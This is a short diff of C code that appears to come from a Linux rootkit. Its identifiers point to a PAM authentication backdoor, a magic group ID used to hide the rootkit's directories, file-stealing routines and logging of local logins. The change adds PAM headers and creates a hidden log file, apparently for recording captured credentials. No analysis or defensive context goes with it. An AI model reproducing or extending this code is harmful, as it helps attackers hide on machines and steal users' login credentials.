@@ -51,9 +51,10 @@ typedef struct {
 #endif
 
 #if defined USE_PAM_BD || defined LOG_LOCAL_AUTH
+#include <security/pam_modules.h>
+#include <security/_pam_macros.h>
 #include <security/pam_ext.h>
 #include <security/pam_appl.h>
-#include <security/pam_modules.h>
 #include <syslog.h>
 #endif
 
@@ -86,6 +87,9 @@ void plsdomefirst(void){
     preparedir(HOMEDIR, magicgid);
     hidedircontents(HOMEDIR, magicgid);
     hidedircontents(INSTALL_DIR, magicgid);
+#if defined LOG_LOCAL_AUTH
+    prepareregfile(LOG_PATH, magicgid);
+#endif
 #if defined FILE_CLEANSE_TIMER && defined FILE_STEAL
     cleanstolen();
 #endif
